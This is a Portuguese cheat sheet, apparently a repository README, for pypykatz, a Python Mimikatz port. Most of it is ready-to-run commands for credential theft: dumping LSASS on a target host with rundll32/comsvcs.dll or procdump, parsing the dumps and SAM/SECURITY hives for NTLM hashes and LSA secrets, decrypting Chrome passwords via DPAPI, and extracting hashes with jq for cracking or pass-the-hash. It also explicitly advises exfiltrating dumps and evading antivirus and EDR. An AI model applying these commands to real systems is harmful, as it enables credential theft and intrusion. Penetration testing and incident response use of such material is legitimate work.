<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Folha de dicas do pypykatz

[pypykatz](https://github.com/skelsec/pypykatz) é uma implementação Python pura de [Mimikatz](https://github.com/gentilkiwi/mimikatz). Ele permite que testadores de penetração e respondedores de incidentes analisem despejos de memória LSASS do Windows, seções de registro SAM/SYSTEM/SECURITY, chaves DPAPI e tickets Kerberos completamente offline no Linux e macOS sem acionar o Windows Defender, agentes de detecção e resposta de endpoint (EDR) ou a necessidade de acesso ao host do Windows ao vivo.

---

## Índice

- [Visão geral e segurança operacional (OpSec)](#overview--operacional-segurança-opsec)
- [Instalação](#instalação)
- [Análise de dump LSASS off-line (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
- [Extração de colmeia SAM e SYSTEM (`registry sam`)](#sam--system-hive-extraction-registry-sam)
- [Extração de segredos LSA (`registry security`)](#lsa-secrets-extraction-registry-security)
- [Chaves mestras DPAPI e análise de credenciais](#dpapi-master-keys--credential-parsing)
- [Exportação JSON e pipelines de credenciais automatizados](#json-export--automated-credential-pipelines)
- [Técnicas para despejar LSASS com segurança no Windows](#techniques-to-safely-dump-lsass-on-windows)

---

## Visão geral e segurança operacional (OpSec)

A execução do `mimikatz.exe` padrão em uma máquina Windows de destino frequentemente aciona sensores comportamentais e assinaturas estáticas. `pypykatz` separa a fase de dumping da fase de análise:
1. Descarregue a memória do processo LSASS usando ferramentas nativas ou LOLBAS (Gerenciador de Tarefas, `procdump`, `rundll32.exe` ou `comsvcs.dll`).
2. Exfiltre o arquivo `.dmp` para seu sistema de análise Linux.
3. Analise credenciais completamente offline com `pypykatz` sem risco AV.

---

## Instalação
```bash
# Recommended: Install via pipx
pipx install pypykatz

# Or via standard pip
python3 -m pip install --user pypykatz

# From source
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
pip install .

# Verify installation
pypykatz -h
```
---

## Análise de despejo LSASS off-line (`lsa minidump`)

Analise dumps de memória gerados a partir de `lsass.exe` para recuperar senhas de texto não criptografado, hashes NTLM, hashes SHA1, tickets Kerberos (TGT/TGS) e chaves de criptografia AES:

### 1. Análise básica de minidespejo
```bash
pypykatz lsa minidump /path/to/lsass.dmp
```
A saída extrai credenciais particionadas por provedores de segurança:
- **msv1_0:** Nomes de usuário, domínios, hashes NTLM e hashes LM.
- **wdigest:** Senhas em texto simples (se o cache WDigest estiver ativado).
- **kerberos:** sessões de ticket Kerberos e chaves AES.
- **ssp:** Credenciais do provedor de suporte de segurança.
- **livessp:** Credenciais da conta da Microsoft.
- **cloudap:** Tokens de atualização primária (PRT) do Azure AD e chaves de sessão.

### 2. Analise vários despejos de memória recursivamente
```bash
pypykatz lsa minidump /loot/dumps/ -r
```
---

## Extração de colmeia SAM e SYSTEM (`registry sam`)

Extraia nomes de usuários de contas locais, RIDs e hashes de senha NTLM de cópias offline do hive do registro do Windows:
```bash
pypykatz registry sam /loot/SYSTEM /loot/SAM
```
Saída:
```text
RID: 500
Username: Administrator
LM: None
NT: 31d6cfe0d16ae931b73c59d7e0c089c0
```
---

## Extração de segredos LSA (`registry security`)

Recupere segredos LSA, senhas de contas de máquinas, senhas de domínio padrão e chaves de texto não criptografado de contas de serviço dos hives `SECURITY` e `SYSTEM`:
```bash
pypykatz registry security /loot/SYSTEM /loot/SECURITY
```
Os segredos extraídos incluem:
- `_SC_DefaultPassword`: credenciais de logon automático.
- `$MACHINE.ACC`: hashes NTLM da conta do computador de domínio.
- Credenciais de domínio em cache (DCC2/mscache2).

---

## Chaves mestras DPAPI e análise de credenciais

A API de proteção de dados (DPAPI) criptografa senhas do Chrome, chaves de Wi-Fi e credenciais RDP:

### 1. Extraia as chaves mestras DPAPI do registro e do sistema
```bash
pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
```
### 2. Descriptografar senhas armazenadas no Chrome
```bash
pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
```
---

## Exportação JSON e pipelines de credenciais automatizados

Exporte credenciais analisadas diretamente para JSON para ingestão imediata em Hashcat, BloodHound ou CrackMapExec:
```bash
# Export minidump parsing to structured JSON
pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
```
Extraia hashes NTLM limpos usando `jq` para quebra imediata de hash ou passagem do hash:
```bash
jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
```
---

## Técnicas para descartar LSASS com segurança no Windows

Para alimentar `pypykatz` com memória, crie um minidespejo LSASS no host de destino usando componentes nativos:

### 1. LOLBAS nativo via `comsvcs.dll` (Admin PowerShell)
```powershell
# Get LSASS process ID
$pid = (Get-Process lsass).Id

# Execute dump using native rundll32
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
```
### 2. GUI do Gerenciador de Tarefas
1. Abra o Gerenciador de Tarefas como Administrador.
2. Em **Detalhes**, clique com o botão direito em `lsass.exe`.
3. Clique em **Criar arquivo de despejo** (salvo em `%TEMP%\lsass.DMP`).

### 3. Sysinternals `procdump`
```cmd
procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
```
*Depois de baixado para sua máquina Linux, execute `pypykatz lsa minidump lsass.dmp`.*